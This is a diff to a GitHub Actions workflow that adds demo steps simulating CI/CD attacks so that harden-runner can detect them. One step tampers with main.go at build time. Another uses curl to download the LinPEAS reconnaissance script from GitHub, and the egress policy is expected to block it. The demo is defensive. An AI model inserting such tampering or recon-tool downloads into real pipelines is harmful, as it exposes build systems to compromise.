@@ -38,8 +38,32 @@ jobs:
       - name: Run tests
         run: go test ./...
 
+      # DEMO: simulates a common CI/CD attack TTP — a compromised step overwriting
+      # source code after checkout but before the build, so the injected code lands
+      # in the compiled binary. harden-runner monitors the workspace and reports this
+      # as a file-tampering event in the run's security insights. The injected content
+      # is a harmless trailing comment so the build still succeeds and behavior is
+      # unchanged; the point is the tamper event, not the payload. Remove after the demo.
+      - name: Demo source file tampering
+        run: |
+          echo '// tampered by demo step at build time' >> main.go
+          git diff --stat
+
       - name: Build binary
         run: go build -o opentelemetry-lazybackend .
+
+      # DEMO: simulates a common CI/CD attack TTP — a compromised step pulling a
+      # reconnaissance/enumeration script (LinPEAS) from raw.githubusercontent.com,
+      # a host intentionally NOT in the allowed-endpoints list above (we only allow
+      # objects./release-assets.githubusercontent.com). With egress-policy: block,
+      # harden-runner blocks the connection and records the attempt in the run's
+      # security insights. The payload is only downloaded to a file (never piped to
+      # a shell) so nothing executes even if the policy were disabled. Remove after the demo.
+      - name: Demo blocked recon-tool download
+        run: |
+          curl --fail --max-time 10 -sSL \
+            https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh \
+            -o /tmp/recon.sh
 
   integration:
     needs: verify
